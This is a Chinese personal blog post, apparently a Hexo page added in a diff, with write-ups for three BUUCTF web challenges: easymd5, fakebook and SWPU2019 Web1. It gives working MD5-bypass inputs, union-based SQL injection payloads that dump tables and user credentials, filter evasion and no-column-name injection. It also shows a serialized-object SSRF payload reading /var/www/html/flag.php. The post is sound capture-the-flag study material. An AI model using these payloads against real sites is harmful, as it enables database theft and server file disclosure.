@@ -1,0 +1,282 @@
+
+
+
+
+
+
+<!doctype html>
+<html lang="en">
+
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script type="text/javascript" 
+src="//cdnjs.cloudflare.com/ajax/libs/prettify/r298/prettify.min.js">
+</script>
+<link href=  "/plugins/code-theme/tomorrow.css" type="text/css" rel="stylesheet" />
+<link rel="stylesheet" href="/plugins/github-markdown.css">
+
+<head>
+  <meta charset="UTF-8" name="viewport" content="width=device-width,initial-scale=1">
+  
+    
+    
+      <link rel="stylesheet" href="/css/legend.css">
+    
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body id="body-x">
+<div id="layout-content">
+  <div id="menu-outer-x">
+  <div id="menu-inner">
+    
+    
+    <div id="site-title">
+      Momax's blog
+    </div>
+    
+
+     
+    <div>
+    
+      
+      <a href="/">首页</a>
+      
+    
+      
+      <a href="/archives">归档</a>
+      
+    
+    </div>
+  </div>
+</div> 
+  <div id="content-outer">
+    <div id="content-inner">
+      
+      
+  <article class="markdown-body">
+    <h2 id="post-title">buu学习之路
+       
+        <div id="post-time" datetime="2020-12-16T04:58:10.539Z">
+          2020-12-16
+        </div>
+      
+    </h2>
+    <p>@<a href="buu学习（自闭）之旅（二）">TOC</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在学习的过程中，越学习越能发现自己的菜，害，奥里给兄弟们干就完了！！</p>
+<h1 id="一、easymd5"><a href="#一、easymd5" class="headerlink" title="一、easymd5"></a>一、easymd5</h1><p>这个题，怎么说呢，真的是绕来绕去，很皮。<br>首先打开题目，<img src="https://img-blog.csdnimg.cn/20201130202118739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="题目"><br>我一看，这是嘛呀，直接输入1抓包吧。于是就发现了很有趣的东西。<br><img src="https://img-blog.csdnimg.cn/20201130202218589.png" alt="有趣的东西"><br>好嘛，这是<code>php MD5</code>函数啊这。于是拿在本地试验了一下。<br><img src="https://img-blog.csdnimg.cn/20201130202311889.png" alt="本地测试"><br>这直接输出的嘛呀，百度了一下发现是<img src="https://img-blog.csdnimg.cn/20201130202336963.png" alt="结果"><br>原来是字符的二进制格式，那么现在就该想了，明显的是sql查询语句，于是构造payload应该能够绕过这个语句，也就是说用神句<code>&#39;or 1=1#</code>这种格式的来进行绕过，这里直接白嫖了网上大师傅们的字符 <code>ffifdyop、129581926211651571912466741651878684928</code>两个都可以，如果有长度限制就选第一个，这里我直接用第一个进行尝试。得到<br><img src="https://img-blog.csdnimg.cn/20201130205328103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="第一次"><br>提示在<code>levels91.php</code>页面中，所以来到这个页面<img src="https://img-blog.csdnimg.cn/20201130205412847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="levels91.php页面"><br>发现php源码</p>
+<pre><code class="python">&lt;!--
+$a = $GET[&#39;a&#39;];
+$b = $_GET[&#39;b&#39;];
+
+if($a != $b &amp;&amp; md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+--&gt;</code></pre>
+<p>所以再次构造payload为：<code>?a[]=1b[]=2</code><br>得到<img src="https://img-blog.csdnimg.cn/2020113020553835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="第二次"><br>提示在<code>levell14.php</code>页面中，来到这个页面<br><img src="https://img-blog.csdnimg.cn/20201130205641457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="得到"><br>看着是不是很花里胡哨，在浏览器打开<img src="https://img-blog.csdnimg.cn/20201130205723474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="第三次"><br>直接payload构造为：<code>param1[]=1&amp;param2[]=2</code>，得到flag<br><img src="https://img-blog.csdnimg.cn/20201130205801213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="flag"><br><strong>总结</strong> 这题完全就是在绕来绕去啊，给我绕笑了都。绕我一个二十岁的小同志，这好吗？这不好。我劝出题人耗子尾汁。</p>
+<pre><code class="python">然后这里总结一下MD5类型的php源码绕过</code></pre>
+<h2 id="MD5绕过姿势"><a href="#MD5绕过姿势" class="headerlink" title="MD5绕过姿势"></a>MD5绕过姿势</h2><h3 id="1、php的弱类型语言"><a href="#1、php的弱类型语言" class="headerlink" title="1、php的弱类型语言"></a>1、php的弱类型语言</h3><p><img src="https://img-blog.csdnimg.cn/20201130210424665.png" alt="弱类型比较"><br>结果<br><img src="https://img-blog.csdnimg.cn/20201130210935348.png" alt="比较结果"></p>
+<h3 id="2、MD5函数漏洞"><a href="#2、MD5函数漏洞" class="headerlink" title="2、MD5函数漏洞"></a>2、MD5函数漏洞</h3><pre><code class="php">&lt;?php
+$a=&#39;&#39;;
+$b=&#39;&#39;;
+if($a!=$b &amp;&amp; md5($a)==md5($b))
+         echo &quot;ok&quot;;
+else
+        echo&quot;nono&quot;;
+?&gt;</code></pre>
+<p>正常情况下会输出<code>nono</code>，但是php语言中的MD5函数有个特性就是<code>不会处理数组型数据，遇到会返回null</code>，但是这里用数组的话明显是没办法绕过的，所以这里就需要另一个特性，就是md5加密后为<code>0e</code>开头的会按照<code>0</code>处理，所以可以构造加密后的是<code>0e</code>开头的字符串进行绕过。这里给出几个</p>
+<pre><code class="php">240610708
+s878926199a
+s155964671a
+s214587387a
+s214587387a</code></pre>
+<p>所以可以利用这个绕过。</p>
+<h3 id="3、MD5碰撞"><a href="#3、MD5碰撞" class="headerlink" title="3、MD5碰撞"></a>3、MD5碰撞</h3><pre><code class="php">&lt;?php
+error_reporting(0);
+if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){
+        die(&quot;success!&quot;);
+}
+
+?&gt;</code></pre>
+<p>如果是这样的，同样可以利用，但是改一下之后，</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+if((string)$_POST[&#39;param1&#39;]!==(string)$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){
+        die(&quot;success!&quot;);
+}
+
+?&gt;</code></pre>
+<p>因为加了一个string强转换，所以无法用上面的那些弱类型的方法了。<br>只能通过MD5强碰撞来绕过，也就是说不同的值得到一个相同的MD5值。<br>然后这里通过一个神奇工具来进行碰撞–<a href="https://github.com/iamjazz/Md5collision" target="_blank" rel="noopener">Md5collision</a><br>具体用法就一句：<code>fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</code>，init.txt是自己创建的文件，随便写东西。<br>然后在<code>Md5collision.php</code>里得到url值，提交。<img src="https://img-blog.csdnimg.cn/20201203154826181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="结果"></p>
+<h1 id="二、fakebook"><a href="#二、fakebook" class="headerlink" title="二、fakebook"></a>二、fakebook</h1><p>打开看了一下，怎么说呢，就很快啊，页面很简洁，给我一个无从下手的感觉。<br>然后就在GitHub上搜索了一下fakebook。然后没发现啥。是我菜了，所以开始吧。<br>尝试了一下robots协议，别说，还真发现了点东西，不知道robots协议的问驴去，别问我驴是谁，我也不知道。下载文件，打开</p>
+<pre><code class="php">&lt;?php
+
+
+class UserInfo
+{
+    public $name = &quot;&quot;;
+    public $age = 0;
+    public $blog = &quot;&quot;;
+
+    public function __construct($name, $age, $blog)
+    {
+        $this-&gt;name = $name;
+        $this-&gt;age = (int)$age;
+        $this-&gt;blog = $blog;
+    }
+
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+
+    public function getBlogContents ()
+    {
+        return $this-&gt;get($this-&gt;blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this-&gt;blog;
+        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+    }
+
+}</code></pre>
+<p>然后就莫名其妙的想到了序列化和反序列化。然后没发现什么了，那就去注册吧。随便注册了一个。得到用户界面<img src="https://img-blog.csdnimg.cn/20201205163352320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="用户界面"><br>发现用户名字那里可以点。此时搜索框发生了奇妙的变化<br><img src="https://img-blog.csdnimg.cn/20201205163452887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="搜索框"><br>突然就想梭一把，来吧，展示，sqlmap一把梭。然而，没梭出来。不慌，大意了。慢慢来。尝试一下联合查询。<img src="https://img-blog.csdnimg.cn/20201205163908696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="第一次"><br>payload为<code>?no=0 union/**/select 1,2,3,4--+</code>(这里之前实验过存在一个union select过滤，以及无闭合符号)，提示回显在第二位<br>而且现在网站的根目录得到了。<br>所以接着就来吧，按照联合查询一个一个来。依次构造payload为：</p>
+<pre><code class="php">爆库名：?no=0 union/**/select 1,database(),3,4--+
+爆表名：?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;--+
+爆字段：?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;--+
+爆值: ?no=0 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users--+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20201205164248943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="爆库名"><br><img src="https://img-blog.csdnimg.cn/20201205164326941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="爆表名"><br><img src="https://img-blog.csdnimg.cn/20201205164527307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="爆字段"><br><img src="https://img-blog.csdnimg.cn/20201205165017909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="爆值"><br>好家伙，看到没，我就说了有序列化吧。<br>可以发现有序列化字符串中，包含了你的所有用户信息，所以构造函数，用上面找到的文件里面的类。</p>
+<pre><code class="php">&lt;?php
+class Userinfo
+{
+    public $name = &quot;12&quot;;
+    public $age = 12;
+    public $blog = &quot;file:///var/www/html/flag.php&quot;;
+}
+$data = new Userinfo();
+echo serialize($data);
+?&gt;</code></pre>
+<p>运行得到序列化字符串：<code>O:8:&quot;Userinfo&quot;:3:{s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}</code><br>所以直接构造最终payload：<code>?no=0 union/**/select 1,2,3,&#39;O:8:&quot;Userinfo&quot;:3:{s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;--+</code>,最终界面：<br><img src="https://img-blog.csdnimg.cn/2020120516532797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="最终界面"><br>发现file协议出现，说明执行成功，直接F12查看源码，得到flag<img src="https://img-blog.csdnimg.cn/20201205165433885.png" alt="flag"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本题考查知识点：<strong>1、ssrf</strong> <strong>2、php序列化</strong> <strong>3、sql注入</strong>，不过好在比较简单，还在我的范围内，没自闭，很抱歉呢。</p>
+<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>之后看了大师傅们的博客，发现了一个更简单的方法 </p>
+<blockquote>
+<p>使用load_file()函数，直接得到flag，不过前提是知道flag文件位置<br>payload：/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4</p>
+</blockquote>
+<p>不过在这之前就直接出来了根目录，也不算太难猜。但是不知道为什么我在尝试的时候不正确，一直报错，有大师傅知道的可以教我一下吗？老司机带带我啊！</p>
+<h1 id="三、-SWPU2019-Web1"><a href="#三、-SWPU2019-Web1" class="headerlink" title="三、[SWPU2019]Web1"></a>三、[SWPU2019]Web1</h1><p>打开题目，发现页面非常的简洁，就一登陆注册框，啥也没有。<img src="https://img-blog.csdnimg.cn/20201216113211850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后也没啥具体的思路，登陆进去看了一下用户的界面，发现了一个可以提供操作的地方。<br><img src="https://img-blog.csdnimg.cn/20201216113841363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="上传位"><br>然后就在想，要不要传个马试一下，说不定就行了呢。于是进行了尝试，发现传进去的马单引号会被按照sql语句处理，这就很明白了，一个sql注入题目。利用上传广告的广告名进行二次注入。<br>然后进行尝试，发现过滤了一些东西，经过尝试发现过滤的有：</p>
+<pre><code class="php">空格，利用/**/绕过；
+order by语句，不知道利用什么，就直接手注尝试发现有22列；
+过滤--+、#
+information_schema，百度得到绕过方法：</code></pre>
+<pre><code class="php">1、利用mysql5.7新增的sys.schema_auto_increment_columns</code></pre>
+<blockquote>
+<p>在mysql5.7版本之后,sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名</p>
+</blockquote>
+<pre><code class="php">2、sys.schema_table_statistics_with_buffer</code></pre>
+<p>sys数据库下的视图，里面存储着所有数据库所有表的统计信息</p>
+<pre><code class="php">3、mysql默认存储引擎innoDB携带的表</code></pre>
+<pre><code class="php">mysql.innodb_table_stats
+ mysql.innodb_index_stats</code></pre>
+<p>两表均有<code>database_name和table_name</code>字段，可以利用。然后这个题目中学到了一个无列名注入。对于这个，详细的可以参照<a href="https://zhuanlan.zhihu.com/p/98206699?utm_source=wechat_session" target="_blank" rel="noopener">无列名注入博客</a> ，里面说的很详细。所以这个题目，拿到之后，因为之前尝试了过滤order by子句，所以只能进行手注，<code>0‘union/**/select/**/1,2,3,&#39;</code><img src="https://img-blog.csdnimg.cn/20201216121822266.png" alt="尝试"><br>在列名尝试到22时，得到回显位。<img src="https://img-blog.csdnimg.cn/2020121612210712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="回显"><br>提示在第二位，所以接着构造payload<code>0&#39;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code>，得到表名。<br><img src="https://img-blog.csdnimg.cn/20201216122609440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="表名"><br>然后发现<code>FLAG_TABLE</code>表名，就幻想flag在里面。然后构造payload：<code>0&#39;union/**/select/**/1,(select/**/group_concat(a)from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/FLAG_TABLE)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code>，得到了nothing<img src="https://img-blog.csdnimg.cn/20201216123120676.png" alt="结果"><br>然后就知道flag不在这里，然后就想是在users里面，所以最终payload为：<code>0&#39;union/**/select/**/1,(select/**/group_concat(a)from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code>，得到flag<img src="https://img-blog.csdnimg.cn/2020121612325763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="结果"></p>
+<h2 id="题目payload讲解"><a href="#题目payload讲解" class="headerlink" title="题目payload讲解"></a>题目payload讲解</h2><p>在刚才的解题过程中，用到的一些payload。<br>在MySQL语句中，有一个给列名起别名的功能，比如<img src="https://img-blog.csdnimg.cn/20201216124512298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="一般的select语句"><br>而如果起别名的话，<img src="https://img-blog.csdnimg.cn/20201216124840291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="别名"><br>而如果接着查询的话，可以这样<br><img src="https://img-blog.csdnimg.cn/20201216125022462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="查询结果"><br>然后还有另一种方法，用于反引号过滤。<br><img src="https://img-blog.csdnimg.cn/20201216125411174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="结果"><br>对于后面的a，b没什么含义，随便起。<br>所以这个payload：<code>0&#39;union/**/select/**/1,(select/**/group_concat(a)from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code>中的意思就是将查询的结果列名用1，2，3表示，给3起个别名为a，然后打印出a列中的所有字符。</p>
+<h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>本题考察知识点：<code>SQL注入中的无列名注入、MySQL中的基本语法</code><br>对于这个，我只想说，果然是纯手工注入才是灵魂！<br><img src="https://gitee.com/momaxx/photos/raw/master/image/2.jpg" alt=""></p>
+
+  </article>
+
+  
+    
+    
+      <div id="page-prev-next">
+        
+        
+          <a id="page-prev-a" href="/2020/12/19/%E4%B8%80%E6%AC%A1%E2%80%9C%E7%BA%BF%E4%B8%8Bawd%E2%80%9D%E5%BF%83%E5%BE%97/"> ← 记第一次参加所谓线下awd </a>
+        
+
+        
+        
+          <a id="page-next-a" href="/2020/12/10/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web22/"> ctfshow萌新计划web22 → </a>
+        
+      </div>
+    
+    
+    
+    
+
+    
+    
+
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div id="reward_comment">文章对我有帮助，打赏作者</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/wechatpay.png" alt="moMaxX WeChat Pay"/>
+          <p>微信</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/alipay.png" alt="moMaxX Alipay"/>
+          <p>支付宝</p>
+        </div> 
+      
+    </div>
+  </div>
+
+
+  
+
+    </div>
+  </div>
+</div>
+
+
+
+<div id="bottom-outer">
+  
+  <div id="bottom-inner">
+    moMaxX 
+    ©2021 |Powered by  
+    <a href="http://hexo.io" target="_blank">Hexo</a> with theme 
+    <a href="https://github.com/iHongRen/legend" target="_blank">legend</a>
+  </div>
+    
+    
+    
+      <a href="/atom.xml">
+      
+      <img src=/images/rss.png height="18" width="18">
+      
+</div> 
+
+
+  
+  
+    <script src="/js/legend.js"></script>
+  
+
+
+</body>
+</html>
+
+
+<script>
+$(window).on('load', function(){
+   $('pre').addClass('prettyprint').attr('style', 'overflow:auto;');
+   prettyPrint();
+ });
+</script>
+
